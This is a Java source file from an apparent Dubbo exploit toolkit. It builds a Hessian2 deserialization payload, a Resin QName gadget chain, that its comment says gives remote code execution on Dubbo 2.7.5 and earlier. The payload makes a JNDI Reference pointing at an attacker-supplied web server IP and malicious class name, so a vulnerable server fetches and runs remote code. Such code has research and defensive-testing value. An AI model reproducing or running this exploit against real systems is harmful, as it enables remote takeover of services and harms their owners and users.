package com.threedr3am.exp.dubbo.payload.hessian;

import com.caucho.naming.QName;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Reflections;
import com.threedr3am.exp.dubbo.utils.ToStringUtil;
import java.lang.reflect.Constructor;
import java.util.Hashtable;
import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
 *
 * Spring和Spring boot环境下都能打，与Spring版本无关了，仅与dubbo版本有关
 *
 * <dependency>
 *    <groupId>com.caucho</groupId>
 *    <artifactId>quercus</artifactId>
 *    <version>4.0.45</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class ResinPoc implements Payload {

  private String[] args;

  /**
   *
   * @param args
   *
   * arg[0]=恶意类所在web服务器ip
   * arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
   *
   * @return
   */
  @Override
  public Object getPayload(String[] args) {
    if (this.args != null)
      args = this.args;
    try {
      Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
      Constructor<?> ccCons = ccCl
          .getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
      ccCons.setAccessible(true);
      CannotProceedException cpe = new CannotProceedException();
      Reflections.setFieldValue(cpe, "cause", null);
      Reflections.setFieldValue(cpe, "stackTrace", null);

      cpe.setResolvedObj(new Reference("Foo", args[1], args[0]));

      Reflections.setFieldValue(cpe, "suppressedExceptions", null);
      DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
      QName qName = new QName(ctx, "foo", "bar");

      Object o = ToStringUtil.makeToStringTrigger(qName);
      return o;
    } catch (Exception e) {
      e.printStackTrace();
    }
    return null;
  }

  @Override
  public void injectDefaultArgs(String[] args) {
    this.args = args;
  }

}
